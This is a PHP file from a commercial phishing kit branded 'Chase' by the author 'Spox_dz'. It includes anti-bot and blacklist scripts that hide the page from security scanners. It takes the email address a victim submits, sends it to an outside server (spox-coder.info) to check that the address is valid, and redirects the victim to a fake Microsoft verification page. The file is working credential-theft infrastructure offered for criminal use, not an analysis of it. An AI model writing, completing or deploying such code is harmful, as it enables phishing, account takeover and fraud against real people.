<?php
ob_start();
session_start();

/**
 * DO NOT SELL THIS SCRIPT ! 
 * DO NOT CHANGE COPYRIGHT !
 * Chase -
 * version 3.0
 * icq & telegram = @spoxcoder
 
###############################################
#$            C0d3d by Spox_dz               $#
#$   Recording doesn't  make you a Coder     $#
#$          Copyright 2020 Chase             $#
###############################################

**/

include'../Anti/IP-BlackList.php';  
include'../Anti/Bot-Crawler.php';
include'../Anti/Bot-Spox.php';
include'../Anti/blacklist.php';
include'../Anti/new.php';
include'../Anti/Dila_DZ.php';

if (!isset($_SESSION['login_SESSION'])) {
  header("Location: ../../index");
  exit();
}

if(isset($_POST['emailhi'])){
$_SESSION['emailhi'] = $_POST['emailhi'];
	include '../../admin/YOUR-CONFIG.php';
	include '../Functions/Fuck-you.php';

$rundom = substr(sha1(mt_rand()),1,25);
$ch=curl_init(); 
		curl_setopt($ch,CURLOPT_SSL_VERIFYPEER,false);
		curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
		curl_setopt($ch,CURLOPT_URL,"https://spox-coder.info/spox/hotmail_valid_email.php?email=".$_SESSION['emailhi']."&api=".$api."");
		curl_setopt($ch,CURLOPT_CONNECTTIMEOUT,0);
		curl_setopt($ch,CURLOPT_TIMEOUT,400);
		$json=curl_exec($ch);
		$checkemail = trim(strip_tags(get_string_between($json,'response":"','","')));

 if ($checkemail == "false") {
		exit(header("Location: ../../microsoft?chase_id=".$rundom."&country=".$_SESSION['country']."&iso=".$_SESSION['countrycode']."&invalid=email"));
	}else{
		exit(header("Location: ../../microsoft_verify?chase_id=".$rundom."&country=".$_SESSION['country']."&iso=".$_SESSION['countrycode'].""));
	}

}else{
    header("HTTP/1.0 404 Not Found");
    exit();
}

?>